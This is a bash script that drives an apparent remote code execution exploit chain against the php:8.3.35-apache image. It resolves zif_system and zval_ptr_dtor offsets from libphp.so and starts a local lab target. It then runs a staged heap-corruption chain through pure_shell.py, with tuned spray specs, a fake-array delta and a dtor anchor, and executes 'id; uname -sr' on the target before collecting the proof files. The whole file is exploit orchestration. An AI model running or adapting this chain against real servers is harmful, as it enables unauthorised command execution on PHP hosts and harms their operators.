#!/bin/bash
# calibrate.sh — end-to-end proof pass for php:8.3.35-apache.
#
#   1. extract libphp.so and read zif_system / zval_ptr_dtor
#   2. start the lab target (single-worker prefork, stock php.ini-production)
#   3. full chain (A1 -> B1 leak -> A2 -> B2) -> id + uname, written to ./out
#
# usage: ./calibrate.sh
set -eu
HERE=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)
LIB=${LIB:-$HERE/libphp.so}
PORT=${PORT:-18138}
LOG=${LOG:-$HERE/evidence/calibrate-8335.log}
SPEC=$(python3 -c "print(','.join(['G:300:0xE2']*16+['X:900']))")

mkdir -p "$HERE/evidence"

echo "[1/3] offsets"
OUT=$("$HERE/offsets.sh" "$LIB" 2>/dev/null || "$HERE/offsets.sh")
echo "$OUT"
ZIF=$(printf '%s\n' "$OUT" | awk '$1=="zif_system"{print $2}')
DTOR=$(printf '%s\n' "$OUT" | awk '$1=="zval_ptr_dtor"{print $2}')
if [ -z "$ZIF" ] || [ -z "$DTOR" ]; then
  echo "failed to resolve offsets" >&2
  exit 1
fi
echo "      zif=$ZIF dtor=$DTOR"

echo "[2/3] target"
"$HERE/run.sh"

echo "[3/3] full chain proof"
python3 "$HERE/../oneshot/pure_shell.py" \
  --host 127.0.0.1 --port "$PORT" --path /index.php \
  --outdir "$HERE/out" --zif "$ZIF" --dtor "$DTOR" \
  --a1-progress 1000 --b1-fake-len 0xC8000 --b1-spec "$SPEC" \
  --b1-page-off 0x968 --s-mode dtor --dtor-anchor=-0x2000000 \
  --fake-array-delta 0xF9398 \
  --exec 'id; uname -sr' \
  --no-banner --log "$LOG" 2>&1 | tee -a "$LOG" || true

echo "--- out/ ---"
ls -la "$HERE/out" | tail -5
echo "--- new proof files ---"
for f in "$HERE"/out/o*; do
  [ -f "$f" ] && { echo "== $f"; cat "$f"; }
done
